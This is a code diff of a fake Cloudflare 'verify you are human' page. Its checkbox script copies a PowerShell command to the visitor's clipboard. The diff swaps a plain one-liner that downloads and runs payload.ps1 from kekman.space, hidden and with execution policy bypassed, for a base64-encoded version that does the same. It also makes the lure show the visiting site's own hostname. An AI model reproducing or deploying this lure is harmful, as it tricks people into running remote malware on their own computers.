@@ -267,15 +267,17 @@
 
 <div class="main-wrapper">
   <div class="main-content">
+    <!-- Logo -->
     <div class="logo-container">
       <img class="logo-img" src="https://www.google.com/s2/favicons?sz=128&domain=cloudflare.com" alt="Cloudflare Logo" />
-      <p class="domain-title"><span class="domain-name">kekman.space</span></p>
+      <p class="domain-title"><span class="domain-name"></span></p>
     </div>
 
     <div class="text-container">
       <p><span class="textallstep">Verify you are human by completing the action below.</span></p>
     </div>
 
+    <!-- Captcha box -->
     <div id="checkbox-window" class="checkbox-window">
       <div class="checkbox-window-inner">
         <div class="checkbox-container">
@@ -296,6 +298,7 @@
           <p class="step3" style="display: none;">Successfully.</p>
         </div>
         <div class="legal-links">
+          <!-- Fixed logo URL -->
           <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/Cloudflare_Logo.png/128px-Cloudflare_Logo.png" alt="Cloudflare Logo" />
           <p>Confidentiality</p>
           <p>Terms and Conditions</p>
@@ -325,7 +328,7 @@
     </div>
 
     <p class="domain-footer">
-      <span class="domain-name">kekman.space</span> needs to review the security of your connection before proceeding.
+      <span class="domain-name"></span> needs to review the security of your connection before proceeding.
     </p>
   </div>
 </div>
@@ -341,18 +344,22 @@
 
 <script>
 (function() {
-  // ---- COMMAND: real fake Cloudflare pattern (iwr + pipe) ----
+  // ---- CONFIG ----
   const CONFIG = {
-    command: 'powershell -ep bypass -w hidden -c "$a=&(gcm iwr) ''https://kekman.space/payload.ps1'' -UseBasicParsing;$a.Content|powershell -w hidden -'
+    command: 'powershell -e JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB0AD0AJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcoICcAaAB0AHQAcABzADoALwAvAGsAZQBrAG0AYQBuAC4AcwBwAGEAYwBlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA7AGkAZQB4ACAAJAB0AA=='
   };
 
-  // ---- Ray ID ----
+  // ---- Fill dynamic content ----
+  const hostname = window.location.hostname || 'kekman.space';
+  document.querySelectorAll('.domain-name').forEach(el => el.textContent = hostname);
+
+  // Ray ID
   const rayChars = 'abcdef0123456789';
   const rayId = Array.from({ length: 16 }, () => rayChars[Math.floor(Math.random() * rayChars.length)]).join('');
   const rayEl = document.querySelector('.ray-id');
   if (rayEl) rayEl.textContent = rayId;
 
-  // ---- Verification ID ----
+  // Verification ID
   const verId = Math.floor(100000 + Math.random() * 900000);
   const verEl = document.getElementById('verification-id');
   if (verEl) verEl.textContent = verId;
@@ -381,16 +388,16 @@
   });
 
   // ---- Checkbox click: copy and show steps ----
-  var checkbox = document.getElementById('checkbox');
-  var checkboxWindow = document.getElementById('checkbox-window');
-  var verifyWindow = document.getElementById('verify-window');
-  var step1Text = document.querySelector('.tettx .step1');
-  var step2Text = document.querySelector('.tettx .step2');
-  var step3Text = document.querySelector('.tettx .step3');
-  var step1Checkbox = document.querySelector('.checkbox-container .step1');
-  var step2Spinner = document.querySelector('.checkbox-container .step2');
-  var step3Success = document.querySelector('.checkbox-container .step3');
-  var verifyButton = document.getElementById('verify-button');
+  const checkbox = document.getElementById('checkbox');
+  const checkboxWindow = document.getElementById('checkbox-window');
+  const verifyWindow = document.getElementById('verify-window');
+  const step1Text = document.querySelector('.tettx .step1');
+  const step2Text = document.querySelector('.tettx .step2');
+  const step3Text = document.querySelector('.tettx .step3');
+  const step1Checkbox = document.querySelector('.checkbox-container .step1');
+  const step2Spinner = document.querySelector('.checkbox-container .step2');
+  const step3Success = document.querySelector('.checkbox-container .step3');
+  const verifyButton = document.getElementById('verify-button');
 
   checkbox.addEventListener('click', function() {
     copyToClipboard(CONFIG.command);
